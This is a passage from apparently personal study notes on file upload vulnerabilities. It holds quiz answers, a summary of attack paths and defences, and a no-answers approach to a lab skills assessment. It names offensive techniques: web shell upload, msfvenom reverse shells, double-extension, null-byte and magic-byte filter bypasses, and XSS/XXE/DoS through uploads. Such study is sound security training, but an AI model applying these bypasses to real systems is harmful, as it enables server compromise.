   The blacklist acts as a safety net that can still block dangerous extensions (like `.php`) even if the whitelist itself gets bypassed through tricks like double extensions.
10. **What authorization concern must a `download.php`-style file-serving script address, and what vulnerability does failing to do so risk?**
    It must verify the requesting user actually owns or is authorized to access the specific requested file, or it risks an IDOR vulnerability.

### 11.5 Two-Minute Final Summary

File upload vulnerabilities arise from weak or missing back-end validation (or vulnerable processing libraries), and are common, high-severity findings. With no validation at all, the path to RCE is simple: identify the backend language (URL extension, index-page brute-force, Wappalyzer), upload a matching web shell or generate a reverse shell (msfvenom), and visit the uploaded file.

Client-side-only validation is always bypassable by editing the raw request in Burp or deleting the validating JavaScript in DevTools. Back-end extension filters come in two forms: blacklists (inherently incomplete — fuzz for gaps like `.phtml`, watch for case-insensitivity on Windows) and whitelists (stronger, but commonly broken by a non-anchored regex, enabling double extensions like `shell.jpg.php`). A strict, properly-anchored whitelist can still be undermined by a separate web-server misconfiguration (reverse double extension) or by character-injection tricks around the extension (`%00`, `:`, etc.) that confuse the filesystem relative to the filter.

Content validation is a separate, often-combined layer: the Content-Type header (client-set, editable) and the true MIME-type/magic-byte signature (spoofable by prepending bytes like `GIF8`) must both be satisfied independently of the extension checks.

Even when arbitrary upload fails entirely, a limited (e.g. images-only) upload form can still enable XSS (HTML files, image metadata, SVG scripts), XXE (SVG/XML/document formats — also useful for reading source code to aid further exploitation), and DoS (decompression bombs, pixel floods, oversized files, path traversal). The filename itself is a separate injection surface if displayed or processed unsafely (command/XSS/SQL injection via filename), and forcing write-errors can disclose an otherwise-hidden upload directory. Windows targets add reserved characters, reserved device names, and 8.3 short-filename tricks to the toolkit.

Prevention stacks multiple layers: combine whitelist and blacklist extension checks, validate content (Content-Type + MIME) alongside extension, never expose the uploads directory directly (serve via an authorization-checked, path-validated download script with proper security headers), randomize stored filenames, isolate upload storage from the main server, disable dangerous execution functions, suppress detailed error messages, and layer on file-size limits, malware scanning, and a WAF.

---

## 12. Skills Assessment: Approach Only

The assessment targets an early-stage e-commerce web application's file upload form(s), with the goal of achieving remote code execution sufficient to read a flag at the filesystem root (`/`). These notes contain no answers. Apply the workflow in §10: identify the backend language, test for absent validation first, then work through the extension/content filter bypass techniques in §4–§5 as needed based on what's actually enforced, and use a web shell (or equivalent RCE primitive) to read the target file once code execution is achieved.
